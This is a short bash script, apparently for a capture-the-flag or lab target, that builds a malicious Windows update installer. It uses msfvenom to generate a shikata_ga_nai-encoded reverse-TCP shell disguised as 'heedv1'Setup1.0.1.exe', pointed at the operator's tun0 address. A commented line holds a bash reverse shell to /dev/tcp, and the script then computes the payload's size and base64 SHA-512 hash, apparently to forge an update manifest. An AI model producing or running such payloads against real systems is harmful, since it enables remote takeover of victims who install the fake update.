echo "Getting tun0 IP..."
ip=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
echo "$ip"

echo "Making payload..."
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$ip LPORT=9001 -b "\x00" -e x86/shikata_ga_nai -f exe -o "heedv1'Setup1.0.1.exe"
#echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$ip/9001 0>&1'\") ?>" > "heedv1'Setup1.0.2.php.exe"

echo "Getting size of payload..."
size=$(stat -c%s "heedv1'Setup1.0.1.exe")
echo "$size" 

echo "Making base64..."
b64=$(shasum -a 512 heedv1\'Setup1.0.1.exe | cut -d " " -f1 | xxd -r -p | base64)
echo "$b64"
